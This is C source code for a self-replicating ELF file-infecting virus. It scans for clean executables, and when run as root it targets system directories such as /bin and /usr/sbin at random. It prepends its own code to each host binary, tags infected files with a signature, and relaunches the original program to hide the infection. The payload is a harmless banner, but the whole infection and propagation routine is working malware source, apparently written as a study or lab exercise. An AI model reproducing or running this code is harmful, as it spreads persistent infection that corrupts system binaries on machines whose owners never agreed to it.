#include <stdio.h>
#include <dirent.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/sendfile.h> 
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <elf.h>

#define SIGNATURE 4033
#define SIZE 18256
#define MAGIC_NUMBER 0x15D25
// #define PAYLOAD_MESSAGE "Virus has entered your system [^-^]"
#define TEMP_FILENAME ".infectedFileImage"

void executeSomethingBad();
char* getCleanHostFile(char *self_name);
bool isOriginalVirus(int vfd);
bool isELF(char* fileName);
bool isClean(char* fileName);
void infectHostFile(char* hostFileName, int vfd);
void appendSignatureToMasterVirus(int vfd, char* fileName, mode_t mode, int size);
void executeHostPart(int vfd, mode_t mode, int totalSize, char *argv[]);

static inline int get_random_number(int max_num){
	return rand()%4;
}
static inline char * randomly_select_dir(char **dirs) 
{	
	return (char *)dirs[get_random_number(4)];
}

void addSignatureToELFPadding(int fd, char *fileName){
    lseek(fd, 0, SEEK_SET);
	struct stat st;
    fstat(fd, &st);

    uint8_t *mem=mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0); 
    *(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER;
	int temp_fd = creat(TEMP_FILENAME, st.st_mode);
	write(temp_fd,mem,st.st_size);
	munmap(mem,st.st_size);
	close(temp_fd);
	rename(TEMP_FILENAME, fileName);
}
void makeCopyAndAddSignature(char *fileName){
	char buf[200];
	strcpy(buf,fileName);
	char buf2[200];
	strcpy(buf2,"cp ");
	strcat(buf2,buf);
	strcat(buf2," ");
	strcat(buf,"2");
	strcat(buf2,buf);

	system(buf2);
	int virus_fd = open(buf, O_RDWR);
    addSignatureToELFPadding(virus_fd, fileName);
	close(virus_fd);
	remove(buf);
}
void main(int argc, char *argv[]) {
    srand(time(0));
	makeCopyAndAddSignature(argv[0]);

	int virus_fd = open(argv[0], O_RDWR);
    struct stat st;
	fstat(virus_fd, &st);
	executeSomethingBad();
	
	char* cleanHostName = getCleanHostFile((char*)argv[0] + 2);
	if(cleanHostName != NULL) 
		infectHostFile(cleanHostName, virus_fd);
		 

	if(isOriginalVirus(virus_fd))
		appendSignatureToMasterVirus(virus_fd, argv[0], st.st_mode, st.st_size);
	else
		executeHostPart(virus_fd, st.st_mode, st.st_size, argv);
	close(virus_fd);
}

/**
 * Execute malacious script
 */


/**
 * Returns true if this file has only the virus code
 */
bool isOriginalVirus(int vfd) {
	return SIZE == lseek(vfd, 0, SEEK_END);
}

/**
 * Gets an ELF file's name that is not yet infected in the current working directory. 
 * If no such files are found, NULL is returned
 */
char* getCleanHostFile(char *self_name) {
	struct stat st;

	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" }; //Addresses of the directories to attack if the user of root
	char cwd[2] = {'.', '\0'}; 
	char *selected_dir = getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
	DIR *dir = opendir(selected_dir);

	struct dirent *dp;
	while((dp = readdir(dir)) != NULL){
		stat(dp->d_name, &st);
		if(!strcmp(dp->d_name, self_name)) continue;	// Don't infect self
		if(isELF(dp->d_name) && isClean(dp->d_name)){
			closedir(dir);
			return dp->d_name;
		}
	}

	closedir(dir);
	return NULL;
}

/**
 * Returns true if the file's format is ELF
 * (Executeable and Linkable Format)
 * ELF files have the first four bytes as 
 * {0x7f, 'E', 'L', 'F'}.
 */
bool isELF(char* fileName) {
	if(fileName[0] == '.') return false;

	int hfd = open(fileName, O_RDONLY);
	char header[4];
	read(hfd, header, 4);
	close(hfd);

	return header[0] == 0x7f
		&& header[1] == 'E'
		&& header[2] == 'L'
		&& header[3] == 'F';
}

/**
 * Returns true if the file has not been infected yet
 * by checking the last few bytes of the file 
 */
bool isClean(char* fileName) {
	int signature;
	int fd = open(fileName, O_RDONLY);
	lseek(fd, -1 * sizeof(signature), SEEK_END);
	read(fd, &signature, sizeof(signature));
	close(fd);
	return signature != SIGNATURE;
}

/**
 * Infect host file by creating a temporary file; 
 * appending the virus/infected file, clean ELF host, and signature;
 * and replacing the host file with the temporary file.
 */
void infectHostFile(char* hostFileName, int virus_fd) {
	int host_fd = open(hostFileName, O_RDONLY);	
	struct stat st;
	fstat(host_fd, &st);
	int hostSize = st.st_size;

	int signature = SIGNATURE;
	
	int temp_fd = creat(TEMP_FILENAME, st.st_mode);	
	// Virus->Host->Signature
	sendfile(temp_fd, virus_fd, NULL, SIZE);
	sendfile(temp_fd, host_fd, NULL, hostSize);
	write(temp_fd, &signature, sizeof(signature));

	rename(TEMP_FILENAME, hostFileName);

	close(temp_fd);
	close(host_fd);
}

/**
 * Append signature to the virus 
 */
void appendSignatureToMasterVirus(int virus_fd, char* fileName, mode_t mode, int size) {
	int temp_fd = creat(TEMP_FILENAME, mode);
	int signature = SIGNATURE;
	lseek(virus_fd, 0, SEEK_SET);
	sendfile(temp_fd, virus_fd, NULL, size);
	write(temp_fd, &signature, sizeof(signature));
	close(temp_fd);
	rename(TEMP_FILENAME, fileName);
}

/**
 * Execute the original host program inside this object file
 */
void executeHostPart(int virus_fd, mode_t mode, int totalSize, char *argv[]) {
	int temp_fd = creat(TEMP_FILENAME, mode);

	lseek(virus_fd, SIZE, SEEK_SET);
	int signatureSize = sizeof(SIGNATURE);
	int hostSize = totalSize - SIZE - signatureSize;
	sendfile(temp_fd, virus_fd, NULL, hostSize);
	close(temp_fd);

	pid_t pid = fork();			
	if(pid == 0) { 			
		execv(TEMP_FILENAME, argv);
	}
	else{					
		waitpid(pid, NULL, 0);		
		unlink(TEMP_FILENAME);
	}
}

void executeSomethingBad() {
	// puts(PAYLOAD_MESSAGE);
const unsigned char skeksi_banner[] = "abc";

write(1, (char *)skeksi_banner, sizeof(skeksi_banner));
}